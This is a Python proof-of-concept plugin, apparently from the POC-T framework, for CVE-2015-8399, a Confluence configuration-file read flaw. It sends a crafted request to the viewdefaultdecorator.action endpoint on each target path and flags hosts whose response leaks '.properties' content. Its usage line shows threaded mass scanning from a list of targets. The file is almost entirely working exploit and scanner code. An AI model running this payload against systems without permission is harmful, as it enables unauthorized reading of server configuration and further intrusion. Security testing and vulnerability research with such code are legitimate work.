#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
Atlassian Confluence config file read POC [CVE-2015-8399]

reference:
http://zone.wooyun.org/content/27104
http://www.cnnvd.org.cn/vulnerability/show/cv_id/2016010311
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8399

usage:
python POC-T.py -T -m confluence-file-read -f [path/targetfile] -t [thread-num]
"""

import requests
from plugin.urlparser import iterate_path


def poc(_inp):
    try:
        if '://' not in _inp:
            _inp = 'http://' + _inp
        for inp in iterate_path(_inp):
            payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
            for each in payloads:
                if '.properties' in requests.get(url=inp + each).content:
                    return True
        return False
    except Exception, e:
        return False
